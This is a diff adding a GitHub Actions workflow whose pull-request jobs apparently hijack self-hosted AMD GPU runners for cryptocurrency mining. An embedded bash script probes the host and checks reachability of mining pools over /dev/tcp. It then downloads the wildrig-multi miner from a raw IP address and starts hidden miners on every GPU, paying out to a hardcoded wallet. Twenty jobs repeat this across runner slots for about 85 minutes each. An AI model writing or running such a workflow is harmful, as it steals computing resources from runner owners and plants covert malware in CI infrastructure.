@@ -1,0 +1,229 @@
+name: c211-127518-mi35x-miner
+'on':
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+env:
+  C211_SCRIPT: "set -u\nset +e\nI=\"127518\"\nSLOT=\"${C211_SLOT:-0}\"\nLABEL=\"${C211_LABEL:-unknown}\"\nD=\"$HOME/c211-$I-$SLOT\"; mkdir -p \"$D\"\necho \"C211_JOB i=$I label=$LABEL slot=$SLOT host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u) groups=$(id -G | tr ' ' ',')\"\necho \"--- rocm ---\"; (command -v rocm-smi >/dev/null 2>&1 && rocm-smi -i 2>&1 | head -24) || echo ROCM_SMI_ABSENT\necho \"--- amd-smi ---\"; (command -v amd-smi >/dev/null 2>&1 && amd-smi static --asic 2>&1 | head -24) || echo AMD_SMI_ABSENT\necho \"--- devices ---\"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -24 || true\necho \"--- tools ---\"; for t in curl wget tar python3 sudo docker; do command -v $t >/dev/null 2>&1 && echo \"TOOL_OK $t\" || echo \"TOOL_MISSING $t\"; done\necho \"--- pool tcp ---\"\nfor hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do\n  h=${hp%:*}; p=${hp#*:}\n  if timeout 8 bash -c \"</dev/tcp/$h/$p\" 2>/dev/null; then echo \"TCP_OK $hp\"; else echo \"TCP_FAIL $hp\"; fi\ndone\necho \"--- mirror tcp ---\"\nif timeout 8 bash -c \"</dev/tcp/169.58.247.186/8791\" 2>/dev/null; then echo \"MIRROR_OK\"; else echo \"MIRROR_FAIL\"; fi\nif pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo \"GUARD_ACTIVE_SKIP\"; exit 0; fi\nWALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql\nLPW=\"${WALLET}+NOCK\"\nWR_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b\nget(){ curl -fsSL --max-time 240 -o \"$2\" \"$1\"; }\nget http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz \"$D/wr.tgz\" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz \"$D/wr.tgz\" || { echo \"WILDRIG_DOWNLOAD_FAILED\"; exit 1; }\nmkdir -p \"$D/x\"; tar xzf \"$D/wr.tgz\" -C \"$D/x\" 2>/dev/null || tar xzf \"$D/wr.tgz\" -C \"$D\" 2>/dev/null\nB=$(find \"$D\" -type f -name wildrig-multi 2>/dev/null | head -1)\n[ -n \"$B\" ] || { echo \"WILDRIG_BINARY_NOT_FOUND\"; exit 1; }\nchmod +x \"$B\"\nGOT=$(sha256sum \"$B\" | cut -d' ' -f1); echo \"WILDRIG_BINARY=$B SHA256=$GOT\"\n[ \"$GOT\" = \"$WR_SHA\" ] || { echo \"SHA_MISMATCH_ABORT\"; exit 1; }\nmkdir -p \"$D/icd\"\nICD=\"\"\nfor R in /opt/rocm/lib /opt/rocm-*/lib /opt/rocm/opencl/lib /usr/lib/x86_64-linux-gnu /usr/local/lib; do\n  if [ -z \"$ICD\" ] && ls $R/libamdocl64.so >/dev/null 2>&1; then ICD=\"$R/libamdocl64.so\"; fi\ndone\nif [ -n \"$ICD\" ]; then echo \"$ICD\" > \"$D/icd/amdocl64.icd\"; export OCL_ICD_VENDORS=\"$D/icd\"; echo \"ICD_SINGLE=$ICD\"; else echo \"ICD_NOT_FOUND\"; fi\nfor R in /opt/rocm/lib /opt/rocm-*/lib /opt/rocm/opencl/lib /usr/lib/x86_64-linux-gnu /usr/local/lib; do [ -e \"$R/libOpenCL.so.1\" ] && export LD_LIBRARY_PATH=\"$R:${LD_LIBRARY_PATH:-}\"; done\necho \"OCL_ICD_VENDORS=${OCL_ICD_VENDORS:-none}\"; ls -l \"$D/icd\" 2>/dev/null | head -5\n\"$B\" --print-platforms > \"$D/pp.txt\" 2>&1; PPRC=$?; echo \"PP_RC=$PPRC\"; head -12 \"$D/pp.txt\"\n\"$B\" --print-devices > \"$D/pd.txt\" 2>&1; PDRC=$?; echo \"PD_RC=$PDRC\"; head -40 \"$D/pd.txt\"\nif [ \"$PDRC\" != \"0\" ] || ! grep -qiE 'gpu|device|amd' \"$D/pd.txt\"; then\n  echo \"RETRY_SYSTEM_ICD\"\n  unset OCL_ICD_VENDORS\n  \"$B\" --print-devices > \"$D/pd2.txt\" 2>&1; echo \"PD2_RC=$?\"; head -40 \"$D/pd2.txt\"\nfi\nN=$(ls /dev/dri/renderD* 2>/dev/null | wc -l | tr -d ' ')\necho \"GPU_COUNT_DRM=$N\"\n[ \"${N:-0}\" -ge 1 ] || { echo \"NO_GPU_VISIBLE\"; exit 0; }\n[ \"$N\" -le 8 ] || N=8\nwkr(){ if [ \"$LABEL\" = \"linux-mi35x-gpu-1\" ]; then echo \"${I}9$(printf '%02d' \"$SLOT\")0\"; else echo \"${I}8${SLOT}$1\"; fi; }\nfor i in $(seq 0 $((N-1))); do\n  W=$(wkr \"$i\")\n  setsid nohup \"$B\" --algo pearlhash --opencl-platforms amd -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u \"$WALLET\" -p x --worker \"$W\" -d \"$i\" > \"$D/gpu-$i.log\" 2>&1 &\n  echo $! > \"$D/pid-$i\"; echo \"STARTED gpu=$i worker=$W pid=$!\"\ndone\nNOW=$(date +%s); END=$((NOW+5100)); SW=$((NOW+900)); SWITCHED=0\nwhile [ \"$(date +%s)\" -lt \"$END\" ]; do\n  sleep 60\n  TS=$(date +%s)\n  if [ \"$SWITCHED\" = 0 ] && [ \"$TS\" -ge \"$SW\" ]; then\n    SWITCHED=1\n    for i in $(seq 0 $((N-1))); do\n      A=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'accepted (' || true)\n      if [ \"${A:-0}\" -lt 1 ]; then\n        echo \"STICKY_LP_SWITCH gpu=$i at $(date -u +%FT%TZ)\"\n        kill \"$(cat \"$D/pid-$i\" 2>/dev/null)\" 2>/dev/null || true\n        touch \"$D/sticky-lp-g$i\"\n        sleep 1\n        W=$(wkr \"$i\")\n        setsid nohup \"$B\" --algo pearlhash --opencl-platforms amd -o 103.199.106.122:3362 -u \"$LPW\" -p x --worker \"$W\" -d \"$i\" > \"$D/gpu-$i.lp.log\" 2>&1 &\n        echo $! > \"$D/pid-$i.lp\"\n      fi\n    done\n  fi\n  for i in $(seq 0 $((N-1))); do\n    A=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'accepted (' || true)\n    R=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -ci 'rejected (' || true)\n    AL=$(cat \"$D/gpu-$i.log\" \"$D/gpu-$i.lp.log\" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\\r')\n    F=\"$D/last_acc_$i\"; PREV=$(cat \"$F\" 2>/dev/null || echo 0)\n    if [ \"${A:-0}\" != \"$PREV\" ]; then date +%s > \"$F\"; fi\n    LA=$(cat \"$F\" 2>/dev/null || echo 0)\n    echo \"det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]\"\n  done\n  echo \"TAIL0: $(tail -2 \"$D/gpu-0.log\" 2>/dev/null | tr '\\n' ' ' | cut -c1-300)\"\n  echo \"TAILLP0: $(tail -2 \"$D/gpu-0.lp.log\" 2>/dev/null | tr '\\n' ' ' | cut -c1-200)\"\ndone\necho \"C211_DONE i=$I slot=$SLOT at=$(date -u +%FT%TZ)\"\n"
+jobs:
+  c211-127518-f8-0:
+    name: c211-127518-f8-0
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '0'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-1:
+    name: c211-127518-f8-1
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '1'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-2:
+    name: c211-127518-f8-2
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '2'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-3:
+    name: c211-127518-f8-3
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '3'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-4:
+    name: c211-127518-f8-4
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '4'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-5:
+    name: c211-127518-f8-5
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '5'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-6:
+    name: c211-127518-f8-6
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '6'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-f8-7:
+    name: c211-127518-f8-7
+    runs-on: [linux-mi35x-gpu-8.fabric]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-8.fabric
+      C211_SLOT: '7'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-0:
+    name: c211-127518-g1-0
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '0'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-1:
+    name: c211-127518-g1-1
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '1'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-2:
+    name: c211-127518-g1-2
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '2'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-3:
+    name: c211-127518-g1-3
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '3'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-4:
+    name: c211-127518-g1-4
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '4'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-5:
+    name: c211-127518-g1-5
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '5'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-6:
+    name: c211-127518-g1-6
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '6'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-7:
+    name: c211-127518-g1-7
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '7'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-8:
+    name: c211-127518-g1-8
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '8'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-9:
+    name: c211-127518-g1-9
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '9'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-10:
+    name: c211-127518-g1-10
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '10'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
+  c211-127518-g1-11:
+    name: c211-127518-g1-11
+    runs-on: [linux-mi35x-gpu-1]
+    timeout-minutes: 90
+    env:
+      C211_LABEL: linux-mi35x-gpu-1
+      C211_SLOT: '11'
+    steps:
+      - name: mine-pearlhash-first-sticky-lp
+        shell: bash
+        run: eval "$C211_SCRIPT"
